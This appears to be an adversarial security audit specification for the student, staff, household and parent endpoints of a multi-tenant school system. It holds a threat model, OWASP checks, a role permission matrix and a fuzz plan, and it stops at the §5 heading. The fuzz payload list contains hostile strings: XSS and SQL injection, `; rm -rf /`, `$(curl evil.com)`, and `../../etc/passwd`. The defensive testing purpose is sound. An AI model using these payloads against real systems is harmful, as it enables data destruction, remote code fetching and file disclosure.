# People — Security Audit Specification

> **Generated:** 2026-04-12  
> **Module slug:** `people`  
> **Mindset:** Adversarial. This spec is written as a paid security consultant would probe the module — the intent is to find the attack that nobody has considered yet and lock it in as a regression test.  
> **Companion specs:** `../admin_view/`, `../integration/`, `../worker/`, `../perf/`.

Severity scale: **P0** (critical — immediate exploit, data exfiltration, RCE, or privilege escalation), **P1** (high — realistic adversarial scenarios, CSRF/XSS with real impact), **P2** (medium — defence-in-depth / hardening), **P3** (low / informational).

---

## Threat model summary

- **Attacker profile A: malicious tenant admin.** Owner or principal of Tenant B attempting to read, mutate, or exfiltrate data belonging to Tenant A. Has a valid JWT for Tenant B.
- **Attacker profile B: malicious internal user (lower privilege).** A teacher or accounting user in Tenant A attempting to elevate their permissions, read staff bank details, or access endpoints outside their role.
- **Attacker profile C: unauthenticated external.** No credentials; attempting XSS via registration, SSRF via file refs, or tactical enumeration via the public routes.
- **Attacker profile D: insider with SQL injection capability.** Testing whether any user-controlled input reaches a raw SQL path.
- **Attacker profile E: compromised worker.** The worker process is compromised; what damage can it do? (Covered in the worker spec's failure isolation; here we confirm the blast radius.)

Blast radius if A succeeds: full tenant data compromise (student PII, medical data, parent contact, staff bank). Blast radius if B reads bank details: financial fraud potential, payroll manipulation, regulatory disclosure.

---

## Table of Contents

1. [Prerequisites & tools](#1-prerequisites--tools)
2. [OWASP Top 10 walkthrough](#2-owasp-top-10-walkthrough)
3. [Permission matrix — every endpoint × every role](#3-permission-matrix--every-endpoint--every-role)
4. [Input injection fuzz](#4-input-injection-fuzz)
5. [Authentication hardening](#5-authentication-hardening)
6. [CSRF + CORS](#6-csrf--cors)
7. [Encrypted-field access control](#7-encrypted-field-access-control)
8. [Audit-log integrity](#8-audit-log-integrity)
9. [Sensitive-data exposure review (responses + logs)](#9-sensitive-data-exposure-review-responses--logs)
10. [Rate limiting](#10-rate-limiting)
11. [Security headers](#11-security-headers)
12. [Dependency audit](#12-dependency-audit)
13. [Business logic abuse](#13-business-logic-abuse)
14. [Summary severity tally + sign-off](#14-summary-severity-tally--sign-off)

---

## 1. Prerequisites & tools

| #   | What to Check                                                                                                                                                              | Expected  | Pass/Fail |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | --------- |
| 1.1 | Two tenants + 8 roles each seeded per integration spec §1.                                                                                                                 | Ready.    |           |
| 1.2 | Burp Suite or `curl` / `httpie` for raw request crafting.                                                                                                                  | Ready.    |           |
| 1.3 | `pnpm audit` available.                                                                                                                                                    | Ready.    |           |
| 1.4 | Valid JWTs captured for: owner, principal, vice-principal, admin, teacher, accounting, front-office, parent, student per tenant. Plus a forged/expired JWT for auth tests. | Captured. |           |
| 1.5 | Network tap to intercept and replay requests with modified payloads.                                                                                                       | Ready.    |           |

---

## 2. OWASP Top 10 walkthrough

### 2.1 A01 — Broken Access Control

| #      | Attempt                                                                                                                   | Expected defence                                                                       | Severity | Pass/Fail |
| ------ | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- | -------- | --------- |
| 2.1.1  | Tenant A owner JWT → `GET /v1/students/{tenantB_student_id}`.                                                             | 404 `STUDENT_NOT_FOUND`. No Tenant B data in body.                                     | P0       |           |
| 2.1.2  | Tenant A owner → PATCH a Tenant B student.                                                                                | 404. No mutation.                                                                      | P0       |           |
| 2.1.3  | Teacher JWT → POST /v1/students.                                                                                          | 403 missing `students.manage`.                                                         | P1       |           |
| 2.1.4  | Teacher JWT → GET /v1/staff-profiles.                                                                                     | 403 missing `users.view`.                                                              | P1       |           |
| 2.1.5  | Accounting JWT → GET /v1/staff-profiles/:id/bank-details.                                                                 | 403 (accounting lacks `payroll.view_bank_details`).                                    | P0       |           |
| 2.1.6  | Unauthenticated → any endpoint.                                                                                           | 401.                                                                                   | P1       |           |
| 2.1.7  | IDOR: iterate UUIDs in `/v1/students/:id` as a low-privilege user.                                                        | Every attempt 404 (tenant-scoped). No enumeration possible since UUIDs are v4 random.  | P1       |           |
| 2.1.8  | Path traversal on `:id` parameter (e.g. `/v1/students/../users/:someone`).                                                | `ParseUUIDPipe` rejects 400.                                                           | P2       |           |
| 2.1.9  | JWT replay across tenants: Tenant A's JWT sent with `X-Tenant-Id: <Tenant B>` header (if such a header exists — confirm). | Request uses JWT's embedded `tenant_id`, NOT the header. Tenant B data not accessible. | P0       |           |
| 2.1.10 | Parent role JWT → any People endpoint.                                                                                    | 403 on all (parent has no `students.*` or `users.*` permissions).                      | P1       |           |
| 2.1.11 | Student role JWT → any People endpoint.                                                                                   | 403 on all.                                                                            | P1       |           |

### 2.2 A02 — Cryptographic Failures

| #      | Attempt                                                                                                                                                                                                                                                                                                                                                                                                                                          | Expected                                                                         | Severity | Pass/Fail |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------- | -------- | --------- |
| 2.2.1  | Read raw SQL `SELECT bank_account_number_encrypted FROM staff_profiles` — plaintext?                                                                                                                                                                                                                                                                                                                                                             | Ciphertext bytes. No plaintext.                                                  | P0       |           |
| 2.2.2  | `GET /v1/staff-profiles/:id` — bank fields in response?                                                                                                                                                                                                                                                                                                                                                                                          | Masked only (`bank_account_last4: "****"` or null). Plaintext never in response. | P0       |           |
| 2.2.3  | `GET /v1/staff-profiles/:id/bank-details` — plaintext in body?                                                                                                                                                                                                                                                                                                                                                                                   | Masked (e.g. `****5678`). Plaintext NEVER.                                       | P0       |           |
| 2.2.4  | Grep server logs for known bank number (e.g. `12345678`) after a bank-details read.                                                                                                                                                                                                                                                                                                                                                              | Zero matches.                                                                    | P0       |           |
| 2.2.5  | TLS enforced — plaintext HTTP to API returns redirect to HTTPS or connection refused.                                                                                                                                                                                                                                                                                                                                                            | TLS-only.                                                                        | P1       |           |
| 2.2.6  | Encryption key stored in AWS Secrets Manager (or equivalent), not in `.env` committed to repo.                                                                                                                                                                                                                                                                                                                                                   | Confirmed.                                                                       | P1       |           |
| 2.2.7  | Encryption algorithm is AES-256-GCM (not AES-CBC without HMAC, not AES-ECB).                                                                                                                                                                                                                                                                                                                                                                     | Via EncryptionService source.                                                    | P1       |           |
| 2.2.8  | JWT signing secret ≥ 32 chars, `HS256` or better.                                                                                                                                                                                                                                                                                                                                                                                                | Confirmed.                                                                       | P1       |           |
| 2.2.9  | Password hash: bcrypt with cost ≥ 10 (current code uses `hash(staffNumber, 12)`).                                                                                                                                                                                                                                                                                                                                                                | bcrypt-12.                                                                       | P1       |           |
| 2.2.10 | Staff-profile create uses `staff_number` as the initial password. That means the initial password has low entropy (~3.3 M combinations). Combined with the numbers being known to the operator who created the profile, this is acceptable for a first-login-then-reset flow — but the staff member MUST be forced to reset on first login. **Confirm** the login flow requires a password change for staff users whose `last_login_at` is null. | Flag **S-A2-1** if not enforced.                                                 | P1       |           |

### 2.3 A03 — Injection

See §4 for the full input fuzz matrix. High-level summary:

| #     | Attempt                                                                                                                                                               | Expected                                                          | Severity | Pass/Fail |
| ----- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | -------- | --------- |
| 2.3.1 | SQL injection via `?search=' OR '1'='1` on any list endpoint.                                                                                                         | Prisma parameterises `contains` — no SQL injection. Confirmed.    | P0       |           |
| 2.3.2 | SQL injection via `?year_group_id=' OR 1=1 --`                                                                                                                        | Zod's `.uuid()` rejects 400.                                      | P0       |           |
| 2.3.3 | Prototype pollution via `__proto__` in JSON body.                                                                                                                     | Zod strips unknown keys; Prisma's update input is strictly typed. | P1       |           |
| 2.3.4 | Command injection — the module has no shell-out paths. Confirm via `grep -rn "exec\|spawn\|shell" apps/api/src/modules/{students,parents,households,staff-profiles}`. | No matches.                                                       | P2       |           |
| 2.3.5 | Template injection — the module has no server-side templating for user-controlled inputs.                                                                             | Confirmed.                                                        | P3       |           |

### 2.4 A04 — Insecure Design

| #     | Attempt                                                                                                                                                               | Expected                                 | Severity | Pass/Fail |
| ----- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- | -------- | --------- |
| 2.4.1 | Invalid state transition: PATCH `/v1/students/{id}/status { status: "paid" }` (value from another enum).                                                              | 400 Zod invalid_enum_value.              | P2       |           |
| 2.4.2 | Status-skipping: applicant → graduated.                                                                                                                               | 400 `INVALID_STATUS_TRANSITION`.         | P2       |           |
| 2.4.3 | Household merge self-to-self.                                                                                                                                         | 400 `SAME_HOUSEHOLD`.                    | P2       |           |
| 2.4.4 | Archived household status can flip back to active (no state-machine enforcement).                                                                                     | **P2** — flag S-A4-1: lack of state map. | P2       |           |
| 2.4.5 | Decimal precision: no monetary fields in this module. N/A.                                                                                                            | N/A.                                     | —        |           |
| 2.4.6 | Negative sequence numbers impossible by construction — `household_number` is random 3+3 letters/digits, `staff_number` is random letters+digits. No integer sequence. | N/A.                                     | —        |           |
| 2.4.7 | Session fixation — a user's session is not reusable after they sign out (verify via `POST /v1/auth/logout` then replaying the old JWT).                               | Old JWT rejected.                        | P1       |           |

### 2.5 A05 — Security Misconfiguration

| #      | Attempt                                                                                                                                                               | Expected           | Severity | Pass/Fail |
| ------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------ | -------- | --------- |
| 2.5.1  | CSP header on HTML responses. Verify `script-src` is tight (no `*`, `unsafe-inline` only via nonce).                                                                  | Present and tight. | P1       |           |
| 2.5.2  | HSTS header with `max-age >= 31536000` and `includeSubDomains`.                                                                                                       | Present.           | P1       |           |
| 2.5.3  | X-Frame-Options: DENY or CSP `frame-ancestors 'none'`.                                                                                                                | Present.           | P1       |           |
| 2.5.4  | X-Content-Type-Options: nosniff.                                                                                                                                      | Present.           | P2       |           |
| 2.5.5  | Referrer-Policy: `strict-origin-when-cross-origin` or tighter.                                                                                                        | Present.           | P2       |           |
| 2.5.6  | Permissions-Policy: explicit allowlist for camera, geolocation, payment, etc.                                                                                         | Present.           | P2       |           |
| 2.5.7  | Error responses in production do NOT include stack traces. Test by hitting a route that triggers a runtime error (e.g. malformed JSON body).                          | Masked.            | P1       |           |
| 2.5.8  | Debug endpoints disabled: grep for `NODE_ENV !== 'production'` leaks in routes.                                                                                       | None.              | P1       |           |
| 2.5.9  | API version header: `X-API-Version` or equivalent optional — informational.                                                                                           | Optional.          | P3       |           |
| 2.5.10 | CORS origin allowlist is tight. Test with `Origin: https://evil.example.com` — response should NOT include `Access-Control-Allow-Origin: *` or the attacker's origin. | Tight.             | P1       |           |

### 2.6 A06 — Vulnerable Components

| #     | Attempt                                                                                                                                      | Expected                                        | Severity | Pass/Fail |
| ----- | -------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- | -------- | --------- |
| 2.6.1 | `pnpm audit` on the api workspace.                                                                                                           | Zero critical CVEs.                             | P0       |           |
| 2.6.2 | `pnpm audit` on the web workspace.                                                                                                           | Zero critical; high CVEs have mitigation notes. | P1       |           |
| 2.6.3 | `pnpm audit` on the worker workspace.                                                                                                        | Zero critical.                                  | P0       |           |
| 2.6.4 | `pnpm audit` on the shared + ui + prisma packages.                                                                                           | Zero critical.                                  | P0       |           |
| 2.6.5 | Lockfile committed (`pnpm-lock.yaml`).                                                                                                       | Present.                                        | P2       |           |
| 2.6.6 | No packages unmaintained > 2 years on the critical path. Spot-check: `bcryptjs`, `zod`, `@nestjs/*`, `@prisma/*`, `bullmq`, `jspdf`, `xlsx`. | All within 2 years.                             | P2       |           |
| 2.6.7 | `xlsx` (SheetJS) specifically — has a history of CVEs. Pinned to latest safe version.                                                        | Current.                                        | P1       |           |

### 2.7 A07 — Identification & Authentication Failures

| #     | Attempt                                                                                                                                                                      | Expected                                                        | Severity | Pass/Fail |
| ----- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- | -------- | --------- |
| 2.7.1 | Expired JWT → any endpoint.                                                                                                                                                  | 401 `TOKEN_EXPIRED` or equivalent.                              | P0       |           |
| 2.7.2 | Forged JWT (wrong signing secret) → any endpoint.                                                                                                                            | 401.                                                            | P0       |           |
| 2.7.3 | Tampered payload (change `sub` to another user) without re-signing.                                                                                                          | 401 (signature mismatch).                                       | P0       |           |
| 2.7.4 | Valid JWT but session revoked (user logged out server-side).                                                                                                                 | 401.                                                            | P1       |           |
| 2.7.5 | Refresh token rotation — using an old refresh after a successful refresh.                                                                                                    | 401. Old refresh is invalidated.                                | P1       |           |
| 2.7.6 | Brute-force login: 100 failed attempts in 60 seconds with same username.                                                                                                     | Rate-limited after N attempts (per auth module's rate limiter). | P1       |           |
| 2.7.7 | Initial-password-never-rotated: a staff user logs in with their `staff_number`, never changes. They retain access using a predictable string. Force rotation on first login. | Rotation enforced.                                              | P1       |           |
| 2.7.8 | MFA bypass attempts — N/A here (MFA is auth-module responsibility; covered in auth security spec).                                                                           | N/A.                                                            | —        |           |

### 2.8 A08 — Software & Data Integrity

| #     | Attempt                                                                                                                                                                                                                                                   | Expected                         | Severity | Pass/Fail |
| ----- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | -------- | --------- |
| 2.8.1 | Tampering with the audit log: try `PATCH /v1/audit-logs/:id` via any endpoint path.                                                                                                                                                                       | 404 (no such route).             | P0       |           |
| 2.8.2 | Direct SQL UPDATE on audit_logs from a compromised worker: what prevents it? — only DB-level safeguards (revoked UPDATE grant on audit_logs from the app role). Verify: `SELECT has_table_privilege('edupod_app', 'audit_logs', 'UPDATE')` returns false. | **S-A8-1** if UPDATE is granted. | P1       |           |
| 2.8.3 | Package integrity: `pnpm-lock.yaml` present. `pnpm install --frozen-lockfile` is used in CI.                                                                                                                                                              | Correct.                         | P1       |           |
| 2.8.4 | Webhooks — N/A for People.                                                                                                                                                                                                                                | —                                | —        |           |
| 2.8.5 | Search documents pushed to Meilisearch (when wired) must use a signed API key; attackers on the same network cannot inject documents.                                                                                                                     | Confirm via Meilisearch config.  | P2       |           |

### 2.9 A09 — Logging & Monitoring

| #     | Attempt                                                                                                                  | Expected                                                                  | Severity | Pass/Fail |
| ----- | ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- | -------- | --------- |
| 2.9.1 | Every mutation generates an audit log row. Verify via spot-checks in §8.                                                 | Correct.                                                                  | P1       |           |
| 2.9.2 | Every sensitive-data read (bank, student detail, allergy report, export-pack) generates a classified audit row.          | Correct.                                                                  | P1       |           |
| 2.9.3 | Sensitive fields NOT in standard logs: grep all log output for known bank number, password, JWT — none found.            | Clean.                                                                    | P0       |           |
| 2.9.4 | Failed-auth attempts logged with rate + source IP — metrics available for anomaly detection.                             | Present.                                                                  | P1       |           |
| 2.9.5 | 5xx responses logged with stack trace server-side but NOT returned to clients.                                           | Correct.                                                                  | P1       |           |
| 2.9.6 | Cross-tenant attempts (A reads B's student, 404) logged as security events with `actor_id`, `target_tenant`, `endpoint`. | **S-A9-1** if missing: cross-tenant attempts are valuable anomaly signal. | P2       |           |

### 2.10 A10 — SSRF

| #      | Attempt                                                                                                                                                 | Expected             | Severity | Pass/Fail |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- | -------- | --------- |
| 2.10.1 | No endpoints in the People module accept user-supplied URLs (no image fetch, no PDF link resolution, no webhook setup).                                 | N/A for this module. | —        |           |
| 2.10.2 | `grep -rn "fetch\|axios\|got" apps/api/src/modules/{students,parents,households,staff-profiles}` — any outbound HTTP calls with user-controllable URLs? | No matches.          | P2       |           |

---

## 3. Permission matrix — every endpoint × every role

Cell format: `HTTP status` / `error code`. Every denied cell MUST be tested; 9+ cells should be 403; 200 cells are the allowed ones. Generate one row per endpoint, one column per role.

**Roles (columns):** `owner`, `principal`, `vice_principal`, `admin`, `teacher`, `accounting`, `front_office`, `parent`, `student`, `unauthenticated`, `cross-tenant-admin`.

Legend: ✅ = 200/201/204 expected; ❌403 = forbidden; ❌401 = unauthenticated; ❌404 = cross-tenant 404.

### 3.1 Students

| Endpoint                         | owner | principal | vp    | admin | teacher | accounting | front_office | parent | student | unauth | cross-tenant A          |
| -------------------------------- | ----- | --------- | ----- | ----- | ------- | ---------- | ------------ | ------ | ------- | ------ | ----------------------- |
| POST /v1/students                | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌403 (role in B lacks) |
| GET /v1/students                 | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅ (own tenant)         |
| GET /v1/students/export-data     | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅                      |
| GET /v1/students/allergy-report  | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅                      |
| GET /v1/students/:id             | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404                   |
| PATCH /v1/students/:id           | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404                   |
| PATCH /v1/students/:id/status    | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404                   |
| GET /v1/students/:id/preview     | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404                   |
| GET /v1/students/:id/export-pack | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404                   |

Note: `vice_principal` per seed only has `admissions.*`, `legal.*`, `privacy.*`, `report_cards.*`, `inbox.*` — no `students.*`. Confirm the table above matches the seed file `packages/prisma/seed/system-roles.ts`.

### 3.2 Staff

| Endpoint                                | owner | principal | vp    | admin | teacher | accounting | front_office | parent | student | unauth | cross-tenant |
| --------------------------------------- | ----- | --------- | ----- | ----- | ------- | ---------- | ------------ | ------ | ------- | ------ | ------------ |
| POST /v1/staff-profiles                 | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅ (own)     |
| GET /v1/staff-profiles                  | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅           |
| GET /v1/staff-profiles/:id              | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |
| PATCH /v1/staff-profiles/:id            | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |
| GET /v1/staff-profiles/:id/bank-details | ✅    | ✅        | ❌403 | ❌403 | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |
| GET /v1/staff-profiles/:id/preview      | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |

### 3.3 Households

| Endpoint                                       | owner | principal | vp    | admin | teacher | accounting | front_office | parent | student | unauth | cross-tenant       |
| ---------------------------------------------- | ----- | --------- | ----- | ----- | ------- | ---------- | ------------ | ------ | ------- | ------ | ------------------ |
| POST /v1/households                            | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅                 |
| GET /v1/households                             | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅                 |
| GET /v1/households/next-number                 | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅                 |
| GET /v1/households/merge                       | 405   | 405       | ❌403 | 405   | 405     | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | 405                |
| POST /v1/households/merge                      | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404 (both sides) |
| POST /v1/households/split                      | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| GET /v1/households/:id                         | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| PATCH /v1/households/:id                       | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| PATCH /v1/households/:id/status                | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| PUT /v1/households/:id/billing-parent          | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| POST /v1/households/:id/emergency-contacts     | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| PATCH /v1/households/:h/emergency-contacts/:c  | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| DELETE /v1/households/:h/emergency-contacts/:c | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| POST /v1/households/:id/parents                | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| DELETE /v1/households/:h/parents/:p            | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| POST /v1/households/:id/students               | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |
| GET /v1/households/:id/preview                 | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404              |

### 3.4 Parents

| Endpoint                          | owner | principal | vp    | admin | teacher | accounting | front_office | parent | student | unauth | cross-tenant |
| --------------------------------- | ----- | --------- | ----- | ----- | ------- | ---------- | ------------ | ------ | ------- | ------ | ------------ |
| POST /v1/parents                  | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅           |
| GET /v1/parents                   | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ✅           |
| GET /v1/parents/:id               | ✅    | ✅        | ❌403 | ✅    | ✅      | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |
| PATCH /v1/parents/:id             | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |
| POST /v1/parents/:id/students     | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |
| DELETE /v1/parents/:p/students/:s | ✅    | ✅        | ❌403 | ✅    | ❌403   | ❌403      | ❌403        | ❌403  | ❌403   | ❌401  | ❌404        |

**Total cells:** (9 endpoints × 11 roles) + (6 × 11) + (18 × 11) + (6 × 11) = **429 cells**. Each row MUST be exercised.

| #   | What to run                                                                                                                            | Expected             | Pass/Fail |
| --- | -------------------------------------------------------------------------------------------------------------------------------------- | -------------------- | --------- |
| 3.5 | Iterate every cell. Automate via a Jest matrix test that tries every (endpoint, role) combination and asserts the expected cell value. | All 429 cells match. |           |

---

## 4. Input injection fuzz

For every user-controlled input field on every endpoint. Fields grouped below; each field × payload class = one row.

Fields inventory:

- **Students**: first_name, middle_name, last_name, first_name_ar, last_name_ar, national_id, date_of_birth (string), gender (enum), status (enum), entry_date, year_group_id (uuid), class_homeroom_id (uuid), student_number, medical_notes, allergy_details, nationality, city_of_birth, household_id (uuid), parent_links[].parent_id (uuid), parent_links[].relationship_label, search (query), reason (status transition).
- **Staff**: first_name, last_name, email, phone, role_id (uuid), job_title, employment_status (enum), department, employment_type (enum), bank_name, bank_account_number, bank_iban, staff_number, search (query).
- **Households**: household_name, address_line1/2, city, postal_code, country, emergency_contacts[].contact_name, .phone, .relationship_label, .display_order, search (query), source_household_id, target_household_id, new_household_name, student_ids[], parent_ids[].
- **Parents**: first_name, last_name, email, phone, whatsapp_phone, preferred_contact_channels[] (enum), relationship_label, role_label.

Payload classes:

- **XSS-1:** `<script>alert(1)</script>`
- **XSS-2:** `"><img src=x onerror=alert(1)>`
- **XSS-3:** `javascript:alert(1)` (URL-style)
- **XSS-4:** polyglot SVG
- **SQLi-1:** `'; DROP TABLE students; --`
- **SQLi-2:** `' OR '1'='1`
- **SQLi-3:** `' UNION SELECT * FROM users --`
- **NoSQLi-1:** `{"$ne": null}` (as string)
- **NoSQLi-2:** `{"$gt": ""}`
- **Command-1:** `; rm -rf /`
- **Command-2:** `$(curl evil.com)`
- **Path-1:** `../../etc/passwd`
- **Path-2:** `%2e%2e%2f`
- **Unicode-1:** `%00` null byte
- **Unicode-2:** homoglyph (e.g. Cyrillic `а` masquerading as Latin `a`)
- **Unicode-3:** overlong UTF-8
- **Oversize-1:** 10 MB string
- **Oversize-2:** deeply nested JSON (10k levels)
- **Type-1:** number where string expected
- **Type-2:** array where scalar expected
- **Type-3:** null where required
- **Type-4:** undefined where optional

Representative rows (the full matrix is fields × payloads = ~400 rows; test at least one field per payload class):

| #    | Field                                                                                                                                              | Payload                                               | Expected                                                                                                                                                                                                   | Severity | Pass/Fail |
| ---- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| 4.1  | student.first_name                                                                                                                                 | XSS-1                                                 | 201 (Zod allows strings). React escapes on render — no alert fires in the UI when viewing the detail. Persisted as-is in DB.                                                                               | P1       |           |
| 4.2  | student.medical_notes                                                                                                                              | XSS-2                                                 | 201. Rendered safely on the medical tab (no dangerouslySetInnerHTML).                                                                                                                                      | P1       |           |
| 4.3  | student.search (query)                                                                                                                             | SQLi-1                                                | 200 with no rows. Prisma parameterises `contains`. DB `students` table intact (count unchanged).                                                                                                           | P0       |           |
| 4.4  | student.year_group_id                                                                                                                              | SQLi-2                                                | 400 Zod `.uuid()` fails.                                                                                                                                                                                   | P0       |           |
| 4.5  | student.household_id                                                                                                                               | NoSQLi-1                                              | 400 Zod.                                                                                                                                                                                                   | P1       |           |
| 4.6  | student.first_name                                                                                                                                 | Oversize-1 (10MB)                                     | 400 (Zod `.max(100)`) OR 413 Payload-Too-Large from the API layer. No OOM.                                                                                                                                 | P1       |           |
| 4.7  | student JSON body                                                                                                                                  | Oversize-2 (deeply nested)                            | 400 or 413. Parser does NOT stack-overflow.                                                                                                                                                                | P1       |           |
| 4.8  | student.date_of_birth                                                                                                                              | Type-1 (number)                                       | 400 Zod string expected.                                                                                                                                                                                   | P2       |           |
| 4.9  | student.parent_links                                                                                                                               | Type-2 (array of strings instead of array of objects) | 400 Zod.                                                                                                                                                                                                   | P2       |           |
| 4.10 | student.first_name                                                                                                                                 | Type-3 (null)                                         | 400 Zod min 1.                                                                                                                                                                                             | P2       |           |
| 4.11 | student.first_name                                                                                                                                 | Unicode-1 (null byte)                                 | 400 OR 201 with the literal null byte stored. Verify: if stored, the UI renders safely (React filters). Flag **S-FZ-1** if the byte causes a downstream parsing issue (e.g. CSV export chops at the null). | P2       |           |
| 4.12 | household.household_name                                                                                                                           | XSS-1                                                 | 201. Rendered safely.                                                                                                                                                                                      | P1       |           |
| 4.13 | household.search                                                                                                                                   | SQLi-1                                                | 200 empty.                                                                                                                                                                                                 | P0       |           |
| 4.14 | staff.email                                                                                                                                        | `test@evil.com'--`                                    | 400 Zod `.email()` fails.                                                                                                                                                                                  | P1       |           |
| 4.15 | staff.bank_account_number                                                                                                                          | SQLi-1                                                | 201. Encrypted as ciphertext; never reaches raw SQL.                                                                                                                                                       | P0       |           |
| 4.16 | parent.preferred_contact_channels                                                                                                                  | `['sms']` (invalid enum)                              | 400 Zod.                                                                                                                                                                                                   | P2       |           |
| 4.17 | parent.email                                                                                                                                       | Oversize-1                                            | 400 Zod `.max(255)`.                                                                                                                                                                                       | P2       |           |
| 4.18 | household_merge.source_household_id                                                                                                                | Path-1 (`../../etc/passwd`)                           | 400 Zod `.uuid()`.                                                                                                                                                                                         | P1       |           |
| 4.19 | student_number                                                                                                                                     | Unicode-2 (homoglyph)                                 | 201 (no Latin-only constraint). Potential for confusing search — flag **S-FZ-2**.                                                                                                                          | P3       |           |
| 4.20 | student.allergy_details                                                                                                                            | XSS-3                                                 | 201. Rendered in `<div>` — React escapes.                                                                                                                                                                  | P1       |           |
| 4.21 | POST body with JSON bomb (100k-key object)                                                                                                         | 400 or 413.                                           | P1                                                                                                                                                                                                         |          |
| 4.22 | Header injection: `Authorization: Bearer abc\r\nX-Custom: evil`                                                                                    | Rejected by HTTP parser.                              | P1                                                                                                                                                                                                         |          |
| 4.23 | Query param injection: `?search=abc%0Aset-cookie:foo` (CRLF in URL)                                                                                | Rejected by HTTP parser.                              | P1                                                                                                                                                                                                         |          |
| 4.24 | Zod-strip surprise: send extra `tenant_id` key in body that is NOT in the schema — confirm it's stripped, NOT used to override the session tenant. | Stripped.                                             | P0                                                                                                                                                                                                         |          |
| 4.25 | Zod `passthrough` vs. `strict`: confirm the schemas do NOT use `.passthrough()` — extra keys are silently stripped.                                | Correct.                                              | P1                                                                                                                                                                                                         |          |

Full 400-row automated matrix: a Jest table test iterates every field × every payload class and asserts the expected response. Tests fixture includes before/after DB counts to detect any successful exploit side-effects.

---

## 5. Authentication hardening

